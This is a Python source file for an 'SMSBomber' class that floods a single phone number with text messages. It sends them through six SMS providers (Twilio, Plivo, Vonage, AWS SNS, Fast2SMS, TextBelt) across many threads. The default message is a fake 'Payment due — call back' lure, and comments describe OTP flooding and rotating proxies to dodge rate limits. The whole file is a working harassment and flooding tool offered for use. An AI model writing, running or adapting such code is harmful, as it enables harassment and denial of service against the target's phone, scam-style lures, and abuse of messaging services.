"""SMS flooding via multiple real SMS providers."""
from __future__ import annotations

import threading
import time
import random
from typing import Callable

import requests


class SMSBomber:
    def __init__(self, target: str, message: str = "Payment due — call back"):
        if not target.startswith("+"):
            raise ValueError("target must be E.164 like +919876543210")
        self.target = target
        self.message = message
        self.stats = {"sent": 0, "failed": 0, "locked": False}
        self._lock = threading.Lock()

    def _hit(self, ok: bool):
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1

    # Twilio
    def twilio_sms(self, sid, token, from_number):
        url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Messages.json"
        try:
            r = requests.post(url, auth=(sid, token), data={
                "To": self.target, "From": from_number, "Body": self.message,
            }, timeout=8)
            self._hit(r.status_code == 201)
            return r.status_code == 201
        except requests.RequestException:
            self._hit(False); return False

    # Plivo
    def plivo_sms(self, auth_id, auth_token, from_number):
        url = f"https://api.plivo.com/v1/Account/{auth_id}/Message/"
        try:
            r = requests.post(url, auth=(auth_id, auth_token), json={
                "src": from_number.lstrip("+"),
                "dst": self.target.lstrip("+"),
                "text": self.message,
            }, timeout=8)
            self._hit(r.status_code in (200, 201))
            return r.status_code in (200, 201)
        except requests.RequestException:
            self._hit(False); return False

    # Vonage
    def vonage_sms(self, api_key, api_secret, from_number):
        try:
            r = requests.post("https://rest.nexmo.com/sms/json", data={
                "api_key": api_key, "api_secret": api_secret,
                "to": self.target.lstrip("+"),
                "from": from_number,
                "text": self.message,
            }, timeout=8)
            self._hit(r.status_code == 200)
            return r.status_code == 200
        except requests.RequestException:
            self._hit(False); return False

    # AWS SNS
    def aws_sns(self, access_key, secret_key, region, sender_id):
        try:
            import boto3
            client = boto3.client("sns", region_name=region,
                                  aws_access_key_id=access_key,
                                  aws_secret_access_key=secret_key)
            r = client.publish(PhoneNumber=self.target, Message=self.message,
                               MessageAttributes={
                                   "AWS.SNS.SMS.SenderID": {"DataType": "String", "StringValue": sender_id},
                                   "AWS.SNS.SMS.SMSType": {"DataType": "String", "StringValue": "Transactional"},
                               })
            self._hit("MessageId" in r)
            return "MessageId" in r
        except Exception:
            self._hit(False); return False

    # Fast2SMS (India-facing, popular for OTP flood)
    def fast2sms(self, api_key, sender_id="FSTSMS"):
        try:
            r = requests.post("https://www.fast2sms.com/dev/bulkV2", headers={
                "authorization": api_key,
                "Content-Type": "application/json",
            }, json={
                "route": "v3",
                "sender_id": sender_id,
                "message": self.message,
                "language": "english",
                "flash": 0,
                "numbers": self.target.lstrip("+")[-10:],
            }, timeout=8)
            ok = r.status_code == 200 and r.json().get("return") is True
            self._hit(ok); return ok
        except Exception:
            self._hit(False); return False

    # TextBelt (free-tier, rate-limited per IP — rotate proxies)
    def textbelt(self, api_key, proxies=None):
        try:
            r = requests.post("https://textbelt.com/text", data={
                "phone": self.target, "message": self.message, "key": api_key,
            }, proxies=proxies, timeout=8)
            ok = r.status_code == 200 and r.json().get("success") is True
            self._hit(ok); return ok
        except Exception:
            self._hit(False); return False

    def run(self, providers: list[Callable[[], bool]],
            workers: int = 20, duration: int = 30,
            delay: float = 0.5) -> dict:
        deadline = time.time() + duration
        def worker():
            while time.time() < deadline and not self.stats["locked"]:
                try: random.choice(providers)()
                except Exception:
                    with self._lock: self.stats["failed"] += 1
                time.sleep(delay + random.uniform(0, delay))
        ts = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
        for t in ts: t.start()
        for t in ts: t.join()
        return dict(self.stats)
